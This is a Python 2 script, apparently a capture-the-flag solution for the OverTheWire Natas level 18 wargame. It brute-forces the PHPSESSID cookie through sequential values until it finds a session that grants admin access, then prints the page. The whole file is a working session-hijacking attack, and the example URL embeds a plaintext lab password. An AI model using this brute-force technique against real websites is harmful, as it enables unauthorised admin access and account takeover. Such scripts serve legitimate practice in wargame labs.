import requests

def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def cookie_bruteforce(target):
	# String we get if we're admin
	exists = "You are an admin."

	# Iterate each session and check if there's one with admin access
	for i in range(641):
		if i % 10 == 0:
			print "[*] Checked", str(i), "sessions."

		cookies = dict(PHPSESSID=str(i))
		req = requests.get(target, cookies=cookies)

		# If the page content's has the admin message
		if req.content.find(exists) != -1:
				print "[*] Admin session found: ", str(i)
				print req.content
				break

	print "[*] Successfully brute-forced session."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	cookie_bruteforce(target)

main()

